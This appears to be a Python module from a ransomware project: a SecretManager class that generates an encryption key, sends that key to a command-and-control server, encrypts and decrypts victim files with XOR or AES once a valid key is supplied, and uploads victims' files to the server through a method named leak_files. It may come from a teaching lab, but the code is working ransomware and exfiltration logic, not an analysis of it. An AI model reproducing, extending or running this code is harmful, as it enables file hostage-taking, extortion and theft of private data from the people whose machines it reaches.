from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xor_crypt import xor_file
from aes_crypt import aes_encrypt_file, aes_decrypt_file

import time


class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port: str = "127.0.0.1:6666", path: str = "/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None
        self.timestamp = None

        self._log = logging.getLogger(self.__class__.__name__)

    # Derive a key using PBKDF2HMAC
    def do_derivation(self, salt: bytes, key: bytes) -> bytes:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.KEY_LENGTH,
            salt=salt,
            iterations=self.ITERATION,
        )
        derived_key = kdf.derive(key)
        return derived_key

    # Create cryptographic elements
    def create(self) -> Tuple[bytes, bytes, bytes, int]:
        salt = secrets.token_bytes(self.SALT_LENGTH)
        key = secrets.token_bytes(self.TOKEN_LENGTH)
        token = self.do_derivation(salt, key)
        timestamp = int(time.time()).to_bytes(4, byteorder="big")
        return salt, key, token, timestamp

    # Convert binary data to base64 string
    def bin_to_b64(self, data: bytes) -> str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    # Send cryptographic elements to CNC
    def post_new(self, salt: bytes, key: bytes, token: bytes,timestamp: int) -> None:
        url = f"http://{self._remote_host_port}/new"
        data = {
            "token": self.bin_to_b64(token),
            "salt": self.bin_to_b64(salt),
            "key": self.bin_to_b64(key),
            "timestamp": self.bin_to_b64(timestamp)
        }
        response = requests.post(url, json=data)

        if response.status_code != 200:
            self._log.error(f"Failed to send data to CNC: {response.text}")
        else:
            self._log.info("Data sent to CNC successfully")

    def setup(self) -> None:
        # Check connection to CNC
        try:
            url = f"http://{self._remote_host_port}/ping"
            response = requests.get(url)
            if response.status_code != 200:
                raise ConnectionError("CNC is unreachable")
        except ConnectionError as e:
            raise e

        # Check if token and salt files exist
        if os.path.exists(os.path.join(self._path, "_token.bin")) or os.path.exists(os.path.join(self._path, "_salt.bin")):
            raise FileExistsError("A _token.bin file already exists. Cancelling setup.")

        # Create cryptographic elements
        self._salt, self._key, self._token,self.timestamp = self.create()
        
        # Create directory if needed
        os.makedirs(self._path, exist_ok=True)
        # Save salt and token locally
        with open(os.path.join(self._path, "_salt.bin"), "wb") as salt_file:
            salt_file.write(self._salt)
        with open(os.path.join(self._path, "_token.bin"), "wb") as token_file:
            token_file.write(self._token)
        with open(os.path.join(self._path, "_timestamp.bin"), "wb") as timestamp_file:
            timestamp_file.write(self.timestamp)
        # Send cryptographic elements to CNC
        self.post_new(self._salt, self._key, self._token, self.timestamp)

    # Load cryptographic data from local files
    def load(self) -> None:
        salt_path = os.path.join(self._path, "_salt.bin")
        token_path = os.path.join(self._path, "_token.bin")

        if os.path.exists(salt_path) and os.path.exists(token_path):
            with open(salt_path, "rb") as salt_file:
                self._salt = salt_file.read()
            with open(token_path, "rb") as token_file:
                self._token = token_file.read()
            with open(os.path.join(self._path, "_timestamp.bin"), "rb") as timestamp_file:
                self.timestamp = timestamp_file.read()
                
        else:
            self._log.warning("The _salt.bin/_token.bin or _timestamp.bin  files do not exist. Unable to load cryptographic data.")

    # Check if the candidate key is valid
    def check_key(self, candidate_key: bytes) -> bool:
        token = self.do_derivation(self._salt, candidate_key)
        return token == self._token

    # Set the decryption key
    def set_key(self, b64_key: str) -> None:
        candidate_key = base64.b64decode(b64_key)

        if self.check_key(candidate_key):
            self._key = candidate_key
        else:
            raise ValueError("The provided key is invalid.")

    # Get the hexadecimal token
    def get_hex_token(self) -> str:
        token_hash = sha256(self._token).hexdigest()
        return token_hash

    def get_int_timestamp(self) -> int:
        return int.from_bytes(self.timestamp, byteorder="big")
    
    # XOR encrypt/decrypt files
    def xor_files(self, files: List[str]) -> None:
        for file_path in files:
            try:
                xor_file(file_path, self._key)
            except Exception as e:
                self._log.error(f"Error encrypting/decrypting file {file_path}: {e}")

    # AES encrypt files
    def aes_files(self, files: List[str]) -> None:
        for file_path in files:
            try:
                aes_encrypt_file(file_path, self._key)
            except Exception as e:
                self._log.error(f"Error encrypting file {file_path}: {e}")

    # AES decrypt files
    def unaes_files(self, files: List[str]) -> None:
        for file_path in files:
            try:
                aes_decrypt_file(file_path, self._key)
            except Exception as e:
                self._log.error(f"Error decrypting file {file_path}: {e}")

    # Send files to CNC
    def leak_files(self, files: List[str]) -> None:
        for file_path in files:
            try:
                with open(file_path, "rb") as f:
                    file_data = f.read()

                file_name = os.path.basename(file_path)
                original_path = os.path.dirname(file_path)
                b64_file_data = self.bin_to_b64(file_data)

                url = f"http://{self._remote_host_port}/file"

                data = {
                    "token": self.get_hex_token(),
                    "file_data": b64_file_data,
                    "file_name": file_name,
                    "original_path": original_path
                }

                response = requests.post(url, json=data, params={"token": self.get_hex_token()})

                if response.status_code != 200:
                    self._log.error(f"Failed to send file {file_path} to CNC: {response.text}")
                else:
                    self._log.info(f"File {file_path} sent to CNC successfully")
            except Exception as e:
                self._log.error(f"Error sending file {file_path} to CNC: {e}")

    # Clean up local cryptographic data and clear in-memory data
    def clean(self) -> None:
        # Remove local cryptographic data (salt.bin and token.bin)
        salt_path = os.path.join(self._path, "_salt.bin")
        token_path = os.path.join(self._path, "_token.bin")

        try:
            if os.path.exists(salt_path):
                os.remove(salt_path)
                self._log.info("Removed _salt.bin file.")
            else:
                self._log.warning("_salt.bin file does not exist.")
        except Exception as e:
            self._log.error(f"Error while removing _salt.bin file: {e}")
        try:
            if os.path.exists(token_path):
                os.remove(token_path)
                self._log.info("Removed _token.bin file.")
            else:
                self._log.warning("_token.bin file does not exist.")
        except Exception as e:
            self._log.error(f"Error while removing _token.bin file: {e}")

        # Clear in-memory data
        self._salt = None
        self._token = None
        self._key = None
